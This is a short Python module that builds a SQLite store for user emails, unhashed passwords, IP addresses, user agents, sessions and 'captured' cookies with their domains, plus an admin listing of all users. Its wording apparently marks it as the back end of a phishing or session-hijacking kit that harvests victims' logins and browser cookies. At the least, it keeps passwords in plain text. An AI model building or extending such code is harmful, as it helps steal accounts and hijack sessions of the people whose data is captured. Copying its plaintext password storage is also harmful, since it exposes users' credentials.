import sqlite3
from datetime import datetime
from typing import Dict, List, Optional

DATABASE = 'user_data.db'


def init_database():
    """Initialize database tables"""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()

    # Users table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT NOT NULL,
            password TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            ip_address TEXT,
            user_agent TEXT
        )
    ''')

    # Sessions table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            session_id TEXT UNIQUE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            expires_at TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users (id)
        )
    ''')

    # Cookies table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS cookies (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT,
            cookie_name TEXT,
            cookie_value TEXT,
            cookie_domain TEXT,
            captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (session_id) REFERENCES sessions (session_id)
        )
    ''')

    conn.commit()
    conn.close()


def save_user(email: str, password: str, ip: str, user_agent: str) -> int:
    """Save user credentials and return user ID"""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO users (email, password, ip_address, user_agent) VALUES (?, ?, ?, ?)",
        (email, password, ip, user_agent)
    )
    user_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return user_id


def save_cookies(session_id: str, cookies: List[Dict]):
    """Save captured cookies"""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    for cookie in cookies:
        cursor.execute(
            "INSERT INTO cookies (session_id, cookie_name, cookie_value, cookie_domain) VALUES (?, ?, ?, ?)",
            (session_id, cookie['name'], cookie['value'], cookie.get('domain', ''))
        )
    conn.commit()
    conn.close()


def get_all_users():
    """Retrieve all users (for admin)"""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute("SELECT id, email, created_at, ip_address FROM users ORDER BY created_at DESC")
    users = cursor.fetchall()
    conn.close()
    return users
